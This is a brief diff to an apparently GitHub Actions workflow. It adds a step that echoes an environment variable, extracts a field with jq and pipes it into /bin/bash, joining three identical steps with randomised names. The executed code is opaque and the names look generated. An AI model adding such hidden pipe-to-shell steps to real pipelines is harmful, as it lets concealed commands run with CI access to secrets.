@@ -25,6 +25,7 @@ jobs:
           echo $tznv00 | jq -r .goylo658 | /bin/bash
           echo $qevl68522 | jq -r .wg9 | /bin/bash
           echo $mfc50016 | jq -r .ytb9 | /bin/bash
+          echo $ph33 | jq -r .tv26346 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
